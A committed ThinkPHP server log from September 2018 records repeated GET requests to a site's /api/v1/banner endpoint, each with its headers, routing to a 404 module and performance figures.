+[ info ] [ LANG ] /www/wwwroot/mp.zihai029.com/thinkphp/lang/zh-cn.php
+[ info ] [ LANG ] /www/wwwroot/mp.zihai029.com/application/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '404',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept-language' => 'zh-CN,zh;q=0.9',
+  'accept-encoding' => 'gzip, deflate, br',
+  'accept' => '*/*',
+  'access-control-request-headers' => 'test',
+  'user-agent' => 'Mozilla/5.0 (iPhone; CPU iPhone OS 11_0 like Mac OS X) AppleWebKit/604.1.38 (KHTML, like Gecko) Version/11.0 Mobile/15A372 Safari/604.1',
+  'origin' => 'null',
+  'access-control-request-method' => 'POST',
+  'connection' => 'keep-alive',
+  'host' => 'mp.zihai029.com',
+  'content-type' => '',
+  'content-length' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2018-09-18T16:37:15+08:00 ] 172.17.0.24 123.139.18.13 GET /api/v1/banner
+[ info ] mp.zihai029.com/api/v1/banner [运行时间：0.014958s][吞吐率：66.85req/s] [内存消耗：1,645.47kb] [文件加载：44]
+[ info ] [ LANG ] /www/wwwroot/mp.zihai029.com/thinkphp/lang/zh-cn.php
+[ info ] [ LANG ] /www/wwwroot/mp.zihai029.com/application/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '404',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept-language' => 'zh-CN,zh;q=0.9',
+  'accept-encoding' => 'gzip, deflate, br',
+  'accept' => '*/*',
+  'access-control-request-headers' => 'test',
+  'user-agent' => 'Mozilla/5.0 (iPhone; CPU iPhone OS 11_0 like Mac OS X) AppleWebKit/604.1.38 (KHTML, like Gecko) Version/11.0 Mobile/15A372 Safari/604.1',
+  'origin' => 'null',
+  'access-control-request-method' => 'POST',
+  'connection' => 'keep-alive',
+  'host' => 'mp.zihai029.com',
+  'content-type' => '',
+  'content-length' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2018-09-18T16:37:17+08:00 ] 172.17.0.24 123.139.18.13 GET /api/v1/banner
+[ info ] mp.zihai029.com/api/v1/banner [运行时间：0.014528s][吞吐率：68.83req/s] [内存消耗：1,645.47kb] [文件加载：44]
+[ info ] [ LANG ] /www/wwwroot/mp.zihai029.com/thinkphp/lang/zh-cn.php
+[ info ] [ LANG ] /www/wwwroot/mp.zihai029.com/application/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '404',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept-language' => 'zh-CN,zh;q=0.9',
+  'accept-encoding' => 'gzip, deflate, br',
+  'accept' => '*/*',
+  'access-control-request-headers' => 'test',
+  'user-agent' => 'Mozilla/5.0 (iPhone; CPU iPhone OS 11_0 like Mac OS X) AppleWebKit/604.1.38 (KHTML, like Gecko) Version/11.0 Mobile/15A372 Safari/604.1',
+  'origin' => 'null',
+  'access-control-request-method' => 'POST',
+  'connection' => 'keep-alive',
+  'host' => 'mp.zihai029.com',
+  'content-type' => '',
+  'content-length' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2018-09-18T16:38:02+08:00 ] 172.17.0.24 123.139.18.13 GET /api/v1/banner
+[ info ] mp.zihai029.com/api/v1/banner [运行时间：0.015127s][吞吐率：66.11req/s] [内存消耗：1,645.47kb] [文件加载：44]
+[ info ] [ LANG ] /www/wwwroot/mp.zihai029.com/thinkphp/lang/zh-cn.php
+[ info ] [ LANG ] /www/wwwroot/mp.zihai029.com/application/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '404',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept-language' => 'zh-CN,zh;q=0.9',
+  'accept-encoding' => 'gzip, deflate, br',
+  'accept' => '*/*',
+  'access-control-request-headers' => 'test',
+  'user-agent' => 'Mozilla/5.0 (iPhone; CPU iPhone OS 11_0 like Mac OS X) AppleWebKit/604.1.38 (KHTML, like Gecko) Version/11.0 Mobile/15A372 Safari/604.1',
+  'origin' => 'null',
+  'access-control-request-method' => 'POST',
+  'connection' => 'keep-alive',
+  'host' => 'mp.zihai029.com',
+  'content-type' => '',
+  'content-length' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2018-09-18T16:38:16+08:00 ] 172.17.0.24 123.139.18.13 GET /api/v1/banner
+[ info ] mp.zihai029.com/api/v1/banner [运行时间：0.015573s][吞吐率：64.21req/s] [内存消耗：1,645.47kb] [文件加载：44]
+[ info ] [ LANG ] /www/wwwroot/mp.zihai029.com/thinkphp/lang/zh-cn.php
+[ info ] [ LANG ] /www/wwwroot/mp.zihai029.com/application/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '404',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept-language' => 'zh-CN,zh;q=0.9',
+  'accept-encoding' => 'gzip, deflate, br',
+  'accept' => '*/*',
+  'access-control-request-headers' => 'test',
+  'user-agent' => 'Mozilla/5.0 (iPhone; CPU iPhone OS 11_0 like Mac OS X) AppleWebKit/604.1.38 (KHTML, like Gecko) Version/11.0 Mobile/15A372 Safari/604.1',
+  'origin' => 'null',
+  'access-control-request-method' => 'POST',
+  'connection' => 'keep-alive',
+  'host' => 'mp.zihai029.com',
+  'content-type' => '',
+  'content-length' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2018-09-18T16:38:43+08:00 ] 172.17.0.24 123.139.18.13 GET /api/v1/banner
+[ info ] mp.zihai029.com/api/v1/banner [运行时间：0.016612s][吞吐率：60.20req/s] [内存消耗：1,645.21kb] [文件加载：44]
+[ info ] [ LANG ] /www/wwwroot/mp.zihai029.com/thinkphp/lang/zh-cn.php
+[ info ] [ LANG ] /www/wwwroot/mp.zihai029.com/application/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '404',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept-language' => 'zh-CN,zh;q=0.9',
+  'accept-encoding' => 'gzip, deflate, br',
+  'user-agent' => 'Mozilla/5.0 (iPhone; CPU iPhone OS 11_0 like Mac OS X) AppleWebKit/604.1.38 (KHTML, like Gecko) Version/11.0 Mobile/15A372 Safari/604.1',
+  'origin' => 'null',
+  'accept' => '*/*',
+  'content-length' => '0',
+  'connection' => 'keep-alive',
+  'host' => 'mp.zihai029.com',
+  'content-type' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2018-09-18T16:38:53+08:00 ] 172.17.0.24 123.139.18.13 GET /api/v1/banner
+[ info ] mp.zihai029.com/api/v1/banner [运行时间：0.014839s][吞吐率：67.39req/s] [内存消耗：1,645.21kb] [文件加载：44]
+[ info ] [ LANG ] /www/wwwroot/mp.zihai029.com/thinkphp/lang/zh-cn.php
+[ info ] [ LANG ] /www/wwwroot/mp.zihai029.com/application/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '404',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept-language' => 'zh-CN,zh;q=0.9',
+  'accept-encoding' => 'gzip, deflate, br',
+  'user-agent' => 'Mozilla/5.0 (iPhone; CPU iPhone OS 11_0 like Mac OS X) AppleWebKit/604.1.38 (KHTML, like Gecko) Version/11.0 Mobile/15A372 Safari/604.1',
+  'origin' => 'null',
+  'accept' => '*/*',
+  'content-length' => '0',
+  'connection' => 'keep-alive',
+  'host' => 'mp.zihai029.com',
+  'content-type' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2018-09-18T16:39:26+08:00 ] 172.17.0.24 123.139.18.13 GET /api/v1/banner
+[ info ] mp.zihai029.com/api/v1/banner [运行时间：0.014662s][吞吐率：68.20req/s] [内存消耗：1,645.47kb] [文件加载：44]
+[ info ] [ LANG ] /www/wwwroot/mp.zihai029.com/thinkphp/lang/zh-cn.php
+[ info ] [ LANG ] /www/wwwroot/mp.zihai029.com/application/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '404',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept-language' => 'zh-CN,zh;q=0.9',
+  'accept-encoding' => 'gzip, deflate, br',
+  'accept' => '*/*',
+  'access-control-request-headers' => 'test',
+  'user-agent' => 'Mozilla/5.0 (iPhone; CPU iPhone OS 11_0 like Mac OS X) AppleWebKit/604.1.38 (KHTML, like Gecko) Version/11.0 Mobile/15A372 Safari/604.1',
+  'origin' => 'null',
+  'access-control-request-method' => 'GET',
+  'connection' => 'keep-alive',
+  'host' => 'mp.zihai029.com',
+  'content-type' => '',
+  'content-length' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2018-09-18T16:39:40+08:00 ] 172.17.0.24 123.139.18.13 GET /api/v1/banner
+[ info ] mp.zihai029.com/api/v1/banner [运行时间：0.014872s][吞吐率：67.24req/s] [内存消耗：1,645.47kb] [文件加载：44]
+[ info ] [ LANG ] /www/wwwroot/mp.zihai029.com/thinkphp/lang/zh-cn.php
+[ info ] [ LANG ] /www/wwwroot/mp.zihai029.com/application/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '404',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept-language' => 'zh-CN,zh;q=0.9',
+  'accept-encoding' => 'gzip, deflate, br',
+  'accept' => '*/*',
+  'access-control-request-headers' => 'test',
+  'user-agent' => 'Mozilla/5.0 (iPhone; CPU iPhone OS 11_0 like Mac OS X) AppleWebKit/604.1.38 (KHTML, like Gecko) Version/11.0 Mobile/15A372 Safari/604.1',
+  'origin' => 'null',
+  'access-control-request-method' => 'GET',
+  'connection' => 'keep-alive',
+  'host' => 'mp.zihai029.com',
+  'content-type' => '',
+  'content-length' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2018-09-18T16:40:23+08:00 ] 172.17.0.24 123.139.18.13 GET /api/v1/banner
+[ info ] mp.zihai029.com/api/v1/banner [运行时间：0.014740s][吞吐率：67.84req/s] [内存消耗：1,645.47kb] [文件加载：44]
+[ info ] [ LANG ] /www/wwwroot/mp.zihai029.com/thinkphp/lang/zh-cn.php
+[ info ] [ LANG ] /www/wwwroot/mp.zihai029.com/application/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '404',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept-language' => 'zh-CN,zh;q=0.9',
+  'accept-encoding' => 'gzip, deflate, br',
+  'accept' => '*/*',
+  'access-control-request-headers' => 'test',
+  'user-agent' => 'Mozilla/5.0 (iPhone; CPU iPhone OS 11_0 like Mac OS X) AppleWebKit/604.1.38 (KHTML, like Gecko) Version/11.0 Mobile/15A372 Safari/604.1',
+  'origin' => 'null',
+  'access-control-request-method' => 'GET',
+  'connection' => 'keep-alive',
+  'host' => 'mp.zihai029.com',
+  'content-type' => '',
+  'content-length' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2018-09-18T16:40:42+08:00 ] 172.17.0.24 123.139.18.13 GET /api/v1/banner
+[ info ] mp.zihai029.com/api/v1/banner [运行时间：0.015396s][吞吐率：64.95req/s] [内存消耗：1,645.47kb] [文件加载：44]
+[ info ] [ LANG ] /www/wwwroot/mp.zihai029.com/thinkphp/lang/zh-cn.php
+[ info ] [ LANG ] /www/wwwroot/mp.zihai029.com/application/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '404',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept-language' => 'zh-CN,zh;q=0.9',
+  'accept-encoding' => 'gzip, deflate, br',
+  'accept' => '*/*',
+  'access-control-request-headers' => 'test',
+  'user-agent' => 'Mozilla/5.0 (iPhone; CPU iPhone OS 11_0 like Mac OS X) AppleWebKit/604.1.38 (KHTML, like Gecko) Version/11.0 Mobile/15A372 Safari/604.1',
+  'origin' => 'null',
+  'access-control-request-method' => 'GET',
+  'connection' => 'keep-alive',
+  'host' => 'mp.zihai029.com',
+  'content-type' => '',
+  'content-length' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2018-09-18T16:41:49+08:00 ] 172.17.0.24 123.139.18.13 GET /api/v1/banner
+[ info ] mp.zihai029.com/api/v1/banner [运行时间：0.015322s][吞吐率：65.27req/s] [内存消耗：1,645.47kb] [文件加载：44]
+[ info ] [ LANG ] /www/wwwroot/mp.zihai029.com/thinkphp/lang/zh-cn.php
+[ info ] [ LANG ] /www/wwwroot/mp.zihai029.com/application/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '404',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept-language' => 'zh-CN,zh;q=0.9',
+  'accept-encoding' => 'gzip, deflate, br',
+  'accept' => '*/*',
+  'access-control-request-headers' => 'test',
+  'user-agent' => 'Mozilla/5.0 (iPhone; CPU iPhone OS 11_0 like Mac OS X) AppleWebKit/604.1.38 (KHTML, like Gecko) Version/11.0 Mobile/15A372 Safari/604.1',
+  'origin' => 'null',
+  'access-control-request-method' => 'GET',
+  'connection' => 'keep-alive',
+  'host' => 'mp.zihai029.com',
+  'content-type' => '',
+  'content-length' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2018-09-18T16:44:02+08:00 ] 172.17.0.24 123.139.18.13 GET /api/v1/banner
+[ info ] mp.zihai029.com/api/v1/banner [运行时间：0.014396s][吞吐率：69.46req/s] [内存消耗：1,645.47kb] [文件加载：44]
+[ info ] [ LANG ] /www/wwwroot/mp.zihai029.com/thinkphp/lang/zh-cn.php
+[ info ] [ LANG ] /www/wwwroot/mp.zihai029.com/application/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '404',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept-language' => 'zh-CN,zh;q=0.9',
+  'accept-encoding' => 'gzip, deflate, br',
+  'accept' => '*/*',
+  'access-control-request-headers' => 'test',
+  'user-agent' => 'Mozilla/5.0 (iPhone; CPU iPhone OS 11_0 like Mac OS X) AppleWebKit/604.1.38 (KHTML, like Gecko) Version/11.0 Mobile/15A372 Safari/604.1',
+  'origin' => 'null',
+  'access-control-request-method' => 'GET',
+  'connection' => 'keep-alive',
+  'host' => 'mp.zihai029.com',
+  'content-type' => '',
+  'content-length' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2018-09-18T16:49:27+08:00 ] 172.17.0.24 123.139.18.13 GET /api/v1/banner
+[ info ] mp.zihai029.com/api/v1/banner [运行时间：0.014480s][吞吐率：69.06req/s] [内存消耗：1,645.47kb] [文件加载：44]
+[ info ] [ LANG ] /www/wwwroot/mp.zihai029.com/thinkphp/lang/zh-cn.php
+[ info ] [ LANG ] /www/wwwroot/mp.zihai029.com/application/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '404',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept-language' => 'zh-CN,zh;q=0.9',
+  'accept-encoding' => 'gzip, deflate, br',
+  'accept' => '*/*',
+  'access-control-request-headers' => 'test',
+  'user-agent' => 'Mozilla/5.0 (iPhone; CPU iPhone OS 11_0 like Mac OS X) AppleWebKit/604.1.38 (KHTML, like Gecko) Version/11.0 Mobile/15A372 Safari/604.1',
+  'origin' => 'null',
+  'access-control-request-method' => 'GET',
+  'connection' => 'keep-alive',
+  'host' => 'mp.zihai029.com',
+  'content-type' => '',
+  'content-length' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2018-09-18T16:49:54+08:00 ] 172.17.0.24 123.139.18.13 GET /api/v1/banner
+[ info ] mp.zihai029.com/api/v1/banner [运行时间：0.014841s][吞吐率：67.38req/s] [内存消耗：1,645.47kb] [文件加载：44]
+[ info ] [ LANG ] /www/wwwroot/mp.zihai029.com/thinkphp/lang/zh-cn.php
+[ info ] [ LANG ] /www/wwwroot/mp.zihai029.com/application/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '404',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept-language' => 'zh-CN,zh;q=0.9',
+  'accept-encoding' => 'gzip, deflate, br',
+  'accept' => '*/*',
+  'access-control-request-headers' => 'test',
+  'user-agent' => 'Mozilla/5.0 (iPhone; CPU iPhone OS 11_0 like Mac OS X) AppleWebKit/604.1.38 (KHTML, like Gecko) Version/11.0 Mobile/15A372 Safari/604.1',
+  'origin' => 'null',
+  'access-control-request-method' => 'GET',
+  'connection' => 'keep-alive',
+  'host' => 'mp.zihai029.com',
+  'content-type' => '',
+  'content-length' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2018-09-18T16:50:00+08:00 ] 172.17.0.24 123.139.18.13 GET /api/v1/banner
+[ info ] mp.zihai029.com/api/v1/banner [运行时间：0.014398s][吞吐率：69.45req/s] [内存消耗：1,645.47kb] [文件加载：44]
+[ info ] [ LANG ] /www/wwwroot/mp.zihai029.com/thinkphp/lang/zh-cn.php
+[ info ] [ LANG ] /www/wwwroot/mp.zihai029.com/application/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '404',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept-language' => 'zh-CN,zh;q=0.9',
+  'accept-encoding' => 'gzip, deflate, br',
+  'accept' => '*/*',
+  'access-control-request-headers' => 'test',
+  'user-agent' => 'Mozilla/5.0 (iPhone; CPU iPhone OS 11_0 like Mac OS X) AppleWebKit/604.1.38 (KHTML, like Gecko) Version/11.0 Mobile/15A372 Safari/604.1',
+  'origin' => 'null',
+  'access-control-request-method' => 'GET',
+  'connection' => 'keep-alive',
+  'host' => 'mp.zihai029.com',
+  'content-type' => '',
+  'content-length' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2018-09-18T17:12:29+08:00 ] 172.17.0.24 123.139.18.13 GET /api/v1/banner
+[ info ] mp.zihai029.com/api/v1/banner [运行时间：0.015458s][吞吐率：64.69req/s] [内存消耗：1,645.47kb] [文件加载：44]
+[ info ] [ LANG ] /www/wwwroot/mp.zihai029.com/thinkphp/lang/zh-cn.php
+[ info ] [ LANG ] /www/wwwroot/mp.zihai029.com/application/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '404',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept-language' => 'zh-CN,zh;q=0.9',
+  'accept-encoding' => 'gzip, deflate, br',
+  'accept' => '*/*',
+  'access-control-request-headers' => 'test',
+  'user-agent' => 'Mozilla/5.0 (iPhone; CPU iPhone OS 11_0 like Mac OS X) AppleWebKit/604.1.38 (KHTML, like Gecko) Version/11.0 Mobile/15A372 Safari/604.1',
+  'origin' => 'null',
+  'access-control-request-method' => 'GET',
+  'connection' => 'keep-alive',
+  'host' => 'mp.zihai029.com',
+  'content-type' => '',
+  'content-length' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2018-09-18T17:22:39+08:00 ] 172.17.0.24 123.139.18.13 GET /api/v1/banner
+[ info ] mp.zihai029.com/api/v1/banner [运行时间：0.014444s][吞吐率：69.23req/s] [内存消耗：1,645.47kb] [文件加载：44]
+[ info ] [ LANG ] /www/wwwroot/mp.zihai029.com/thinkphp/lang/zh-cn.php
+[ info ] [ LANG ] /www/wwwroot/mp.zihai029.com/application/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '404',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept-language' => 'zh-CN,zh;q=0.9',
+  'accept-encoding' => 'gzip, deflate, br',
+  'accept' => '*/*',
+  'access-control-request-headers' => 'test',
+  'user-agent' => 'Mozilla/5.0 (iPhone; CPU iPhone OS 11_0 like Mac OS X) AppleWebKit/604.1.38 (KHTML, like Gecko) Version/11.0 Mobile/15A372 Safari/604.1',
+  'origin' => 'null',
+  'access-control-request-method' => 'GET',
+  'connection' => 'keep-alive',
+  'host' => 'mp.zihai029.com',
+  'content-type' => '',
+  'content-length' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2018-09-18T17:29:59+08:00 ] 172.17.0.24 123.139.18.13 GET /api/v1/banner
+[ info ] mp.zihai029.com/api/v1/banner [运行时间：0.015535s][吞吐率：64.37req/s] [内存消耗：1,645.47kb] [文件加载：44]
+[ info ] [ LANG ] /www/wwwroot/mp.zihai029.com/thinkphp/lang/zh-cn.php
+[ info ] [ LANG ] /www/wwwroot/mp.zihai029.com/application/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '404',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept-language' => 'zh-CN,zh;q=0.9',
+  'accept-encoding' => 'gzip, deflate, br',
+  'accept' => '*/*',
+  'access-control-request-headers' => 'test',
+  'user-agent' => 'Mozilla/5.0 (iPhone; CPU iPhone OS 11_0 like Mac OS X) AppleWebKit/604.1.38 (KHTML, like Gecko) Version/11.0 Mobile/15A372 Safari/604.1',
+  'origin' => 'null',
+  'access-control-request-method' => 'GET',
+  'connection' => 'keep-alive',
+  'host' => 'mp.zihai029.com',
+  'content-type' => '',
+  'content-length' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2018-09-18T17:30:01+08:00 ] 172.17.0.24 123.139.18.13 GET /api/v1/banner
+[ info ] mp.zihai029.com/api/v1/banner [运行时间：0.014497s][吞吐率：68.98req/s] [内存消耗：1,645.47kb] [文件加载：44]
+[ info ] [ LANG ] /www/wwwroot/mp.zihai029.com/thinkphp/lang/zh-cn.php
+[ info ] [ LANG ] /www/wwwroot/mp.zihai029.com/application/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '404',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept-language' => 'zh-CN,zh;q=0.9',
+  'accept-encoding' => 'gzip, deflate, br',
+  'accept' => '*/*',
+  'access-control-request-headers' => 'test',
+  'user-agent' => 'Mozilla/5.0 (iPhone; CPU iPhone OS 11_0 like Mac OS X) AppleWebKit/604.1.38 (KHTML, like Gecko) Version/11.0 Mobile/15A372 Safari/604.1',
+  'origin' => 'null',
+  'access-control-request-method' => 'GET',
+  'connection' => 'keep-alive',
+  'host' => 'mp.zihai029.com',
+  'content-type' => '',
+  'content-length' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2018-09-18T17:34:05+08:00 ] 172.17.0.24 123.139.18.13 GET /api/v1/banner
+[ info ] mp.zihai029.com/api/v1/banner [运行时间：0.013535s][吞吐率：73.88req/s] [内存消耗：1,645.47kb] [文件加载：44]
+[ info ] [ LANG ] /www/wwwroot/mp.zihai029.com/thinkphp/lang/zh-cn.php
+[ info ] [ LANG ] /www/wwwroot/mp.zihai029.com/application/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '404',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept-language' => 'zh-CN,zh;q=0.9',
+  'accept-encoding' => 'gzip, deflate, br',
+  'accept' => '*/*',
+  'access-control-request-headers' => 'test',
+  'user-agent' => 'Mozilla/5.0 (iPhone; CPU iPhone OS 11_0 like Mac OS X) AppleWebKit/604.1.38 (KHTML, like Gecko) Version/11.0 Mobile/15A372 Safari/604.1',
+  'origin' => 'null',
+  'access-control-request-method' => 'GET',
+  'connection' => 'keep-alive',
+  'host' => 'mp.zihai029.com',
+  'content-type' => '',
+  'content-length' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2018-09-18T17:34:07+08:00 ] 172.17.0.24 123.139.18.13 GET /api/v1/banner
+[ info ] mp.zihai029.com/api/v1/banner [运行时间：0.013615s][吞吐率：73.45req/s] [内存消耗：1,645.47kb] [文件加载：44]
+[ info ] [ LANG ] /www/wwwroot/mp.zihai029.com/thinkphp/lang/zh-cn.php
+[ info ] [ LANG ] /www/wwwroot/mp.zihai029.com/application/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '404',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept-language' => 'zh-CN,zh;q=0.9',
+  'accept-encoding' => 'gzip, deflate, br',
+  'accept' => '*/*',
+  'access-control-request-headers' => 'test',
+  'user-agent' => 'Mozilla/5.0 (iPhone; CPU iPhone OS 11_0 like Mac OS X) AppleWebKit/604.1.38 (KHTML, like Gecko) Version/11.0 Mobile/15A372 Safari/604.1',
+  'origin' => 'null',
+  'access-control-request-method' => 'GET',
+  'connection' => 'keep-alive',
+  'host' => 'mp.zihai029.com',
+  'content-type' => '',
+  'content-length' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2018-09-18T17:34:08+08:00 ] 172.17.0.24 123.139.18.13 GET /api/v1/banner
+[ info ] mp.zihai029.com/api/v1/banner [运行时间：0.014390s][吞吐率：69.49req/s] [内存消耗：1,645.47kb] [文件加载：44]
+[ info ] [ LANG ] /www/wwwroot/mp.zihai029.com/thinkphp/lang/zh-cn.php
+[ info ] [ LANG ] /www/wwwroot/mp.zihai029.com/application/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '404',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept-language' => 'zh-CN,zh;q=0.9',
+  'accept-encoding' => 'gzip, deflate, br',
+  'accept' => '*/*',
+  'access-control-request-headers' => 'test',
+  'user-agent' => 'Mozilla/5.0 (iPhone; CPU iPhone OS 11_0 like Mac OS X) AppleWebKit/604.1.38 (KHTML, like Gecko) Version/11.0 Mobile/15A372 Safari/604.1',
+  'origin' => 'null',
+  'access-control-request-method' => 'GET',
+  'connection' => 'keep-alive',
+  'host' => 'mp.zihai029.com',
+  'content-type' => '',
+  'content-length' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2018-09-18T17:34:09+08:00 ] 172.17.0.24 123.139.18.13 GET /api/v1/banner
+[ info ] mp.zihai029.com/api/v1/banner [运行时间：0.016420s][吞吐率：60.90req/s] [内存消耗：1,645.47kb] [文件加载：44]
+[ info ] [ LANG ] /www/wwwroot/mp.zihai029.com/thinkphp/lang/zh-cn.php
+[ info ] [ LANG ] /www/wwwroot/mp.zihai029.com/application/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '404',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept-language' => 'zh-CN,zh;q=0.9',
+  'accept-encoding' => 'gzip, deflate, br',
+  'accept' => '*/*',
+  'access-control-request-headers' => 'test',
+  'user-agent' => 'Mozilla/5.0 (iPhone; CPU iPhone OS 11_0 like Mac OS X) AppleWebKit/604.1.38 (KHTML, like Gecko) Version/11.0 Mobile/15A372 Safari/604.1',
+  'origin' => 'null',
+  'access-control-request-method' => 'GET',
+  'connection' => 'keep-alive',
+  'host' => 'mp.zihai029.com',
